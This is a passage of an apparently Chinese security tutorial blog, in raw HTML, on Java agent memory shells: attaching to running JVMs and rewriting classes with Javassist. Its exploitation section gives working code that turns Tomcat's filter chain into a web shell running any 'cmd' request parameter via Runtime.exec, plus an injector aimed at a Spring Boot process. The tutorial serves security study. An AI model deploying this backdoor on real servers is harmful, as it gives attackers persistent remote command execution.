class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Inject_Agent</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class=\"line\">        <span class=\"comment\">//调用VirtualMachine.list()获取正在运行的JVM列表</span></span><br><span class=\"line\">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class=\"line\">            <span class=\"comment\">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(vmd.displayName().equals(<span class=\"string\">&quot;com.drunkbaby.Sleep_Hello&quot;</span>))&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">//连接指定JVM</span></span><br><span class=\"line\">                <span class=\"type\">VirtualMachine</span> <span class=\"variable\">virtualMachine</span> <span class=\"operator\">=</span> VirtualMachine.attach(vmd.id());</span><br><span class=\"line\">                <span class=\"comment\">//加载Agent</span></span><br><span class=\"line\">                virtualMachine.loadAgent(<span class=\"string\">&quot;/Users/taoyu/Music/code/java_code/Java-Agent-Memshell/Agentmain/src/main/resources/hello.jar&quot;</span>);</span><br><span class=\"line\">                <span class=\"comment\">//断开JVM连接</span></span><br><span class=\"line\">                virtualMachine.detach();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>先运行Sleep_Hello再运行Inject_Agent。输出如下。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hello World!</span><br><span class=\"line\">调用了agentmain-Agent!</span><br><span class=\"line\">Hello World!</span><br><span class=\"line\">调用了agentmain-Agent!</span><br><span class=\"line\">调用了agentmain-Agent!</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>但是这里我们这里只是插入，而不是改变。</p>\n</blockquote>\n<h2 id=\"动态修改字节码\"><a href=\"#动态修改字节码\" class=\"headerlink\" title=\"动态修改字节码\"></a>动态修改字节码</h2><p>Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent 通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。</p>\n<p>ClassFileTransformer接口下面有一个addTransformer方法。重写该方法即可转换任意类文件，并返回新的被取代的类文件，</p>\n<p>下面我们来修改这个正在运行的hello</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Sleep_Hello</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> InterruptedException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">            hello();</span><br><span class=\"line\">            sleep(<span class=\"number\">3000</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">hello</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;Hello World!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>一个实现了ClassFileTransformer接口的类。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Hello_Transform</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">ClassFileTransformer</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class=\"type\">byte</span>[] classfileBuffer) <span class=\"keyword\">throws</span> IllegalClassFormatException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//获取CtClass 对象的容器 ClassPool</span></span><br><span class=\"line\">            <span class=\"type\">ClassPool</span> <span class=\"variable\">classPool</span> <span class=\"operator\">=</span> ClassPool.getDefault();</span><br><span class=\"line\">            <span class=\"comment\">//添加额外的类搜索路径</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (classBeingRedefined != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"type\">ClassClassPath</span> <span class=\"variable\">ccp</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ClassClassPath</span>(classBeingRedefined);</span><br><span class=\"line\">                classPool.insertClassPath(ccp);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//获取目标类</span></span><br><span class=\"line\">            <span class=\"type\">CtClass</span> <span class=\"variable\">ctClass</span> <span class=\"operator\">=</span> classPool.get(<span class=\"string\">&quot;AgentShell.Sleep_Hello&quot;</span>);</span><br><span class=\"line\">            System.out.println(ctClass);</span><br><span class=\"line\">            <span class=\"comment\">//获取目标方法</span></span><br><span class=\"line\">            <span class=\"type\">CtMethod</span> <span class=\"variable\">ctMethod</span> <span class=\"operator\">=</span> ctClass.getDeclaredMethod(<span class=\"string\">&quot;hello&quot;</span>);</span><br><span class=\"line\">            <span class=\"comment\">//设置方法体</span></span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">body</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;&#123;System.out.println(\\&quot;Hacker!\\&quot;);&#125;&quot;</span>;</span><br><span class=\"line\">            ctMethod.setBody(body);</span><br><span class=\"line\">            <span class=\"comment\">//返回目标类字节码</span></span><br><span class=\"line\">            <span class=\"type\">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class=\"line\">            <span class=\"keyword\">return</span> bytes;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>agent </p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">agentmain_transform</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">agentmain</span><span class=\"params\">(String args, Instrumentation inst)</span> <span class=\"keyword\">throws</span> InterruptedException, UnmodifiableClassException &#123;</span><br><span class=\"line\">        Class [] classes = inst.getAllLoadedClasses();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//获取目标JVM加载的全部类</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span>(Class cls : classes)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (cls.getName().equals(<span class=\"string\">&quot;AgentShell.Sleep_Hello&quot;</span>))&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">//添加一个transformer到Instrumentation，并重新触发目标类加载</span></span><br><span class=\"line\">                inst.addTransformer(<span class=\"keyword\">new</span> <span class=\"title class_\">Hello_Transform</span>(),<span class=\"literal\">true</span>);</span><br><span class=\"line\">                inst.retransformClasses(cls);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>修改一下mf文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Manifest-Version: 1.0</span><br><span class=\"line\">Agent-Class: AgentShell.agentmain_transform</span><br><span class=\"line\">Can-Redefine-Classes: true</span><br><span class=\"line\">Can-Retransform-Classes: true</span><br></pre></td></tr></table></figure>\n\n<p>pom.xml  这里使用assembly生成说需要的jar包</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.maven.plugins<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-assembly-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.6<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">descriptorRefs</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">descriptorRef</span>&gt;</span>jar-with-dependencies<span class=\"tag\">&lt;/<span class=\"name\">descriptorRef</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">descriptorRefs</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">archive</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">manifestFile</span>&gt;</span></span><br><span class=\"line\">            src/main/resources/META-INF/maven/MAINFEST.MF</span><br><span class=\"line\">          <span class=\"tag\">&lt;/<span class=\"name\">manifestFile</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">archive</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.maven.plugins<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-compiler-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">source</span>&gt;</span>6<span class=\"tag\">&lt;/<span class=\"name\">source</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">target</span>&gt;</span>6<span class=\"tag\">&lt;/<span class=\"name\">target</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">build</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>先运行Sleep_Hello 再运行这个</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Inject_Agent</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"comment\">//调用VirtualMachine.list()获取正在运行的JVM列表</span></span><br><span class=\"line\">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class=\"line\">            System.out.println(vmd.displayName());</span><br><span class=\"line\">            <span class=\"comment\">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(vmd.displayName().equals(<span class=\"string\">&quot;AgentShell.Sleep_Hello&quot;</span>))&#123;</span><br><span class=\"line\">                <span class=\"comment\">//连接指定JVM</span></span><br><span class=\"line\">                <span class=\"type\">VirtualMachine</span> <span class=\"variable\">virtualMachine</span> <span class=\"operator\">=</span> VirtualMachine.attach(vmd.id());</span><br><span class=\"line\">                <span class=\"comment\">//加载Agent</span></span><br><span class=\"line\">                virtualMachine.loadAgent(<span class=\"string\">&quot;/Users/taoyu/Music/code/java_code/Java-Agent-Memshell/Instrumentation/target/Instrumentation-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;</span>);</span><br><span class=\"line\">                <span class=\"comment\">//断开JVM连接</span></span><br><span class=\"line\">                virtualMachine.detach();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hello World!</span><br><span class=\"line\">Hello World!</span><br><span class=\"line\">Hello World!</span><br><span class=\"line\">Hello World!</span><br><span class=\"line\">Hello World!</span><br><span class=\"line\">Hello World!</span><br><span class=\"line\">javassist.CtClassType@6ae33825[public class AgentShell.Sleep_Hello fields= constructors=javassist.CtConstructor@58966603[public Sleep_Hello ()V],  methods=javassist.CtMethod@44a4fe33[public static main ([Ljava/lang/String;)V], javassist.CtMethod@30063153[public static hello ()V], ]</span><br><span class=\"line\">Hacker!</span><br><span class=\"line\">Hacker!</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"一些利用\"><a href=\"#一些利用\" class=\"headerlink\" title=\"一些利用\"></a>一些利用</h1><h2 id=\"利用agentmain注入Filter内存马\"><a href=\"#利用agentmain注入Filter内存马\" class=\"headerlink\" title=\"利用agentmain注入Filter内存马\"></a>利用agentmain注入Filter内存马</h2><p>准备好实现了ClassFileTransformer接口的Filter_Transform</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Filter_Transform</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">ClassFileTransformer</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class=\"type\">byte</span>[] classfileBuffer) <span class=\"keyword\">throws</span> IllegalClassFormatException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//获取CtClass 对象的容器 ClassPool</span></span><br><span class=\"line\">            <span class=\"type\">ClassPool</span> <span class=\"variable\">classPool</span> <span class=\"operator\">=</span> ClassPool.getDefault();</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//添加额外的类搜索路径</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (classBeingRedefined != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"type\">ClassClassPath</span> <span class=\"variable\">ccp</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ClassClassPath</span>(classBeingRedefined);</span><br><span class=\"line\">                classPool.insertClassPath(ccp);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//获取目标类</span></span><br><span class=\"line\">            <span class=\"type\">CtClass</span> <span class=\"variable\">ctClass</span> <span class=\"operator\">=</span> classPool.get(<span class=\"string\">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//获取目标方法</span></span><br><span class=\"line\">            <span class=\"type\">CtMethod</span> <span class=\"variable\">ctMethod</span> <span class=\"operator\">=</span> ctClass.getDeclaredMethod(<span class=\"string\">&quot;doFilter&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//设置方法体</span></span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">body</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;&#123;&quot;</span> +</span><br><span class=\"line\">                    <span class=\"string\">&quot;javax.servlet.http.HttpServletRequest request = $1\\n;&quot;</span> +</span><br><span class=\"line\">                    <span class=\"string\">&quot;String cmd=request.getParameter(\\&quot;cmd\\&quot;);\\n&quot;</span> +</span><br><span class=\"line\">                    <span class=\"string\">&quot;if (cmd !=null)&#123;\\n&quot;</span> +</span><br><span class=\"line\">                    <span class=\"string\">&quot;  Runtime.getRuntime().exec(cmd);\\n&quot;</span> +</span><br><span class=\"line\">                    <span class=\"string\">&quot;  &#125;&quot;</span>+</span><br><span class=\"line\">                    <span class=\"string\">&quot;&#125;&quot;</span>;</span><br><span class=\"line\">            ctMethod.setBody(body);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//返回目标类字节码</span></span><br><span class=\"line\">            <span class=\"type\">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class=\"line\">            <span class=\"keyword\">return</span> bytes;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>准备agent</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">agentmain_transform</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">agentmain</span><span class=\"params\">(String args, Instrumentation inst)</span> <span class=\"keyword\">throws</span> InterruptedException, UnmodifiableClassException &#123;</span><br><span class=\"line\">        Class [] classes = inst.getAllLoadedClasses();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//获取目标JVM加载的全部类</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span>(Class cls : classes)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (cls.getName().equals(<span class=\"string\">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>))&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">//添加一个transformer到Instrumentation，并重新触发目标类加载</span></span><br><span class=\"line\">                inst.addTransformer(<span class=\"keyword\">new</span> <span class=\"title class_\">Filter_Transform</span>(),<span class=\"literal\">true</span>);</span><br><span class=\"line\">                inst.retransformClasses(cls);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>mf文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Manifest-Version: 1.0</span><br><span class=\"line\">Agent-Class: com.drunkbaby.agentmain_transform</span><br><span class=\"line\">Can-Redefine-Classes: true</span><br><span class=\"line\">Can-Retransform-Classes: true</span><br></pre></td></tr></table></figure>\n\n<p>生成对应jar包,然后开始注入</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Inject_Agent</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException &#123;</span><br><span class=\"line\">        <span class=\"comment\">//调用VirtualMachine.list()获取正在运行的JVM列表</span></span><br><span class=\"line\">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class=\"line\">            System.out.println(vmd.displayName());</span><br><span class=\"line\">            <span class=\"comment\">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(vmd.displayName().contains(<span class=\"string\">&quot;JavaAgentSpringBootApplication&quot;</span>))&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">//连接指定JVM</span></span><br><span class=\"line\">                <span class=\"type\">VirtualMachine</span> <span class=\"variable\">virtualMachine</span> <span class=\"operator\">=</span> VirtualMachine.attach(vmd.id());</span><br><span class=\"line\">                <span class=\"comment\">//加载Agent</span></span><br><span class=\"line\">                virtualMachine.loadAgent(<span class=\"string\">&quot;/Users/taoyu/Music/code/java_code/Java-Agent-Memshell/AgentInjectionExample/target/AgentInjectionExample-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;</span>);</span><br><span class=\"line\">                <span class=\"comment\">//断开JVM连接</span></span><br><span class=\"line\">                virtualMachine.detach();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>注入成功。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241120183255665.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241120183255665.png\"  alt=\"image-20241120183255665\" lazyload></a></p>\n<h2 id=\"Jackson删除writeReplace方法\"><a href=\"#Jackson删除writeReplace方法\" class=\"headerlink\" 